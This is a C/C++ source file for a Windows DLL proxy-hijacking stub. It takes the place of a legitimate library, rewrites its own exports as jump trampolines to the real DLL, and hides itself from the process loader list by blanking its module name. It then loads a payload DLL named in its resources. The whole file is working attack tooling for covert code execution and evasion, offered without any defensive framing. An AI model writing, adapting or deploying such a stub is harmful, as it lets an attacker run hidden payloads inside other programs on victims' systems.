#include <Windows.h>
#include "resource.h"
#include "stub_defs.h"
#include "../ntdll/ntdll.h"

bool is_empty_string(char* str)
{
	return (strlen(str) == 0 ? true : false);
}

void raise_error(wchar_t* message)
{
	HARDERROR_RESPONSE hr; 
	UNICODE_STRING msg, title;
	ULONG_PTR error[3];

	RtlInitUnicodeString(&msg, message);
	RtlInitUnicodeString(&title, L"Hijacking error");

	error[0] = (ULONG_PTR)&msg;
	error[1] = (ULONG_PTR)&title;
	error[2] = (ULONG_PTR)MB_OK;

	ZwRaiseHardError(STATUS_SERVICE_NOTIFICATION, 3, 3, error, OptionOk, &hr);
	//ZwTerminateProcess((HANDLE)-1, 0);
}

char* get_resource_ptr(HMODULE hmod, ULONG_PTR type, ULONG_PTR name, ULONG_PTR lang, PSIZE_T psize)
{
	NTSTATUS status;
	PIMAGE_RESOURCE_DATA_ENTRY pentry;
	LDR_RESOURCE_INFO info;

	info.Type = type;
	info.Name = name;
	info.Language = lang;

	status = LdrFindResource_U(hmod, &info, 3, &pentry);
	if (!NT_SUCCESS(status))
		return 0;
	
	if (psize)
		*psize = pentry->Size;

	return (char*)((ULONG_PTR)hmod + pentry->OffsetToData);
}

HMODULE load_library(char* name)
{
	NTSTATUS status;
	UNICODE_STRING path;
	STRING ansi_path;
	HMODULE hlib;

	RtlInitAnsiString(&ansi_path, name);
	status = RtlAnsiStringToUnicodeString(&path, (PCANSI_STRING)&ansi_path, TRUE);
	if (NT_SUCCESS(status)) {
		status = LdrLoadDll(0, 0, &path, &hlib);
		RtlFreeUnicodeString(&path);
	}

	if (!NT_SUCCESS(status))
		return 0;

	return hlib;
}

bool find_export_name(DWORD finx, PDWORD pnames, PWORD pords, unsigned int count, LPSTR* ppname, PWORD pordinal)
{
	DWORD i;
	bool found = false;

	for (i = 0; i < count; i++) {
		if (pords[i] == finx) {
			*ppname = (LPSTR)pnames[i];
			*pordinal = i;
			found = true;
			break;
		}
	}

	return found;
}

void* get_export_by_name(HMODULE hmod, LPSTR name)
{
	PIMAGE_DOS_HEADER pdos;
	PIMAGE_OPTIONAL_HEADER popt;
	PIMAGE_EXPORT_DIRECTORY pexp;
	PDWORD pnames, pfuncs;
	PWORD pords;
	UINT i;
	LPSTR proc;

	//getting export directory
	pdos = (PIMAGE_DOS_HEADER)hmod;
	if (pdos->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	popt = (PIMAGE_OPTIONAL_HEADER)(pdos->e_lfanew + (UINT_PTR)hmod + 4 + sizeof(IMAGE_FILE_HEADER));

	if (!popt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
		return NULL;

	pexp = (PIMAGE_EXPORT_DIRECTORY)(popt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (UINT_PTR)hmod);

	//searching function name
	pnames = (PDWORD)(pexp->AddressOfNames + (UINT_PTR)hmod);
	pords = (PWORD)(pexp->AddressOfNameOrdinals + (UINT_PTR)hmod);
	pfuncs = (PDWORD)(pexp->AddressOfFunctions + (UINT_PTR)hmod);

	for (i = 0; i < pexp->NumberOfNames; i++) {
		proc = (LPSTR)(pnames[i] + (UINT_PTR)hmod);
		if (!strcmp(proc, name))
			break;
	}
	if (i == pexp->NumberOfNames)
		return NULL;

	return (FARPROC)(pfuncs[pords[i]] + (UINT_PTR)hmod);
}

void* get_export_by_ord(HMODULE hmod, DWORD ord)
{
	PIMAGE_DOS_HEADER pdos;
	PIMAGE_OPTIONAL_HEADER popt;
	PIMAGE_EXPORT_DIRECTORY pexp;
	PDWORD pnames, pfuncs;
	PWORD pords;
	UINT i, finx;

	//getting export directory
	pdos = (PIMAGE_DOS_HEADER)hmod;
	if (pdos->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;
	
	popt = (PIMAGE_OPTIONAL_HEADER)(pdos->e_lfanew + (UINT_PTR)hmod + 4 + sizeof(IMAGE_FILE_HEADER));
	pexp = (PIMAGE_EXPORT_DIRECTORY)(popt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (UINT_PTR)hmod);
	if (!pexp)
		return NULL;
	
	//searching function name
	pnames = (PDWORD)(pexp->AddressOfNames + (UINT_PTR)hmod);
	pords = (PWORD)(pexp->AddressOfNameOrdinals + (UINT_PTR)hmod);
	pfuncs = (PDWORD)(pexp->AddressOfFunctions + (UINT_PTR)hmod);
	finx = ord - pexp->Base;

	for (i = 0; i < pexp->NumberOfNames; i++)
		if (pords[i] == finx)
			break;

	if (i == pexp->NumberOfNames)
		return NULL;

	return (FARPROC)(pfuncs[pords[i]] + (UINT_PTR)hmod);
}

void redirect_tramp32(LPVOID trampl, LPVOID orig_proc)
{
	PTRAMPLONE32 ptramp = (PTRAMPLONE32)trampl;
	ptramp->opcode = 0xE9;
	ptramp->addr = ((UINT_PTR)orig_proc - (UINT_PTR)trampl - sizeof(TRAMPLONE32));
}

void redirect_tramp64(LPVOID trampl, LPVOID orig_proc)
{
	PTRAMPLONE64 ptramp = (PTRAMPLONE64)trampl;
	ptramp->opcode = 0xB848;
	ptramp->addr = (ULONGLONG)orig_proc;
	ptramp->opcode2 = 0xE0FF;
}

bool redirect_export(HMODULE hsrc, HMODULE hdest)
{
	PIMAGE_DOS_HEADER pdos;
	PIMAGE_NT_HEADERS pheader;
	PIMAGE_EXPORT_DIRECTORY pexport;
	DWORD func_count, name_count, i;
	PDWORD pfunc, pname;
	PWORD pord;

	pdos = (PIMAGE_DOS_HEADER)hsrc;
	if (pdos->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	pheader = (PIMAGE_NT_HEADERS)((UINT_PTR)hsrc + pdos->e_lfanew);
	if (pheader->Signature != IMAGE_NT_SIGNATURE)
		return false;

	if (!pheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
		return false;

	pexport = (PIMAGE_EXPORT_DIRECTORY)((UINT_PTR)hsrc + pheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	func_count = pexport->NumberOfFunctions;
	name_count = pexport->NumberOfNames;
	pfunc = (PDWORD)((UINT_PTR)hsrc + pexport->AddressOfFunctions);
	pname = (PDWORD)((UINT_PTR)hsrc + pexport->AddressOfNames);
	pord =   (PWORD)((UINT_PTR)hsrc + pexport->AddressOfNameOrdinals);

	for (i = 0; i < func_count; i++) {
		LPSTR name;
		WORD ordinal;
		LPVOID orig_proc, fake_proc;

		if (!pfunc[i])
			continue;

		if (!find_export_name(i, pname, pord, name_count, &name, &ordinal))
			return false;

		if (name) {//name
			name = (LPSTR)((UINT_PTR)hsrc + name);
			orig_proc = get_export_by_name(hdest, name);
		} else {//ordinal
			ordinal += pexport->Base;
			orig_proc = get_export_by_ord(hdest, ordinal);
		}

		if (orig_proc == 0)
			return false;

		fake_proc = (LPVOID)((UINT_PTR)hsrc + pfunc[i]);
#ifdef _M_AMD64
		redirect_tramp64(fake_proc, orig_proc);
#else
		redirect_tramp32(fake_proc, orig_proc);
#endif
	}

	return true;
}

bool remove_from_ldr_list(HMODULE hmodule)
{
	PPEB peb = GetPEB();
	NTSTATUS res;
	ULONG_PTR Cookie, Disposition;
	bool removed = false;
	PLDR_MODULE module, first;

	res = LdrLockLoaderLock(0, &Disposition, &Cookie);
	if (!NT_SUCCESS(res))
		return false;

	module = (PLDR_MODULE)((UINT)peb->LoaderData->InMemoryOrderModuleList.Blink - sizeof(LIST_ENTRY));

	first = module;
	do {
		if (module->BaseAddress == hmodule) {
			removed = true;

			/*module->InInitializationOrderModuleList.Blink->Flink = module->InInitializationOrderModuleList.Flink;
			module->InInitializationOrderModuleList.Flink->Blink = module->InInitializationOrderModuleList.Blink;

			module->InLoadOrderModuleList.Blink->Flink = module->InLoadOrderModuleList.Flink;
			module->InLoadOrderModuleList.Flink->Blink = module->InLoadOrderModuleList.Blink;

			module->InMemoryOrderModuleList.Blink->Flink = module->InMemoryOrderModuleList.Flink;
			module->InMemoryOrderModuleList.Flink->Blink = module->InMemoryOrderModuleList.Blink;*/
			module->BaseDllName.Length = 0;
			module->FullDllName.Length = 0;
			break;
		}

		module = (PLDR_MODULE)((UINT)module->InMemoryOrderModuleList.Blink - sizeof(LIST_ENTRY));
	} while (first != module);

	res = LdrUnlockLoaderLock(0, Cookie);
	return removed;
}

bool start_stub(HMODULE hmodule)
{
	char* lib_name = 0;
	HMODULE hmod_orig = 0;
	HMODULE hmod_payload = 0;

	// Load original library

 	lib_name = get_resource_ptr(hmodule, (ULONG_PTR)RT_RCDATA, IDR_NAME1, 1049, 0);
	if (!lib_name) {
		raise_error(L"Error, can't load library name");
		return false;
	}

	if (!is_empty_string(lib_name)) {

		// Load and redirect original import

		hmod_orig = load_library(lib_name);
		if (!hmod_orig) {
			raise_error(L"Error, can't load original library");
			return false;
		}

		if (!redirect_export(hmodule, hmod_orig)) {
			raise_error(L"Error, can't redirect export entries");
			return false;
		}

		if (!remove_from_ldr_list(hmodule)) {
			raise_error(L"Error, can't remove self from ldr module list");
			return false;
		}
	}

	// Load payload

	lib_name = get_resource_ptr(hmodule, (ULONG_PTR)RT_RCDATA, IDR_NAME2, 1049, 0);
	if (!lib_name) {
		raise_error(L"Error, can't load library name");
		return false;
	}

	hmod_payload = load_library(lib_name);
	if (!hmod_payload) {
		raise_error(L"Error, can't load payload library");
		return false;
	}

	return true;
}

// Bypass _DllMainCRTStartup
#pragma comment(linker, "/ENTRY:DllMainEntry")

BOOL WINAPI DllMainEntry(HMODULE hmodule, DWORD reason, LPVOID reserved)
{
	switch (reason) {
	case DLL_PROCESS_ATTACH:
		return start_stub(hmodule);
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	};

	return TRUE;
}

#pragma comment(linker, "/SECTION:.rsrc,rwe")

#pragma comment(linker, "/SECTION:.data,rwe")

extern "C" __declspec(dllexport) char test1[5] = {1, 2, 3, 4, 5};
/*extern "C" __declspec(dllexport) char test2[5] = {1, 2, 3, 4, 5};
extern "C" __declspec(dllexport) char test3[5] = {1, 2, 3, 4, 5};
extern "C" __declspec(dllexport) char test4[5] = {1, 2, 3, 4, 5};
extern "C" __declspec(dllexport) char test5[5] = {1, 2, 3, 4, 5};
*/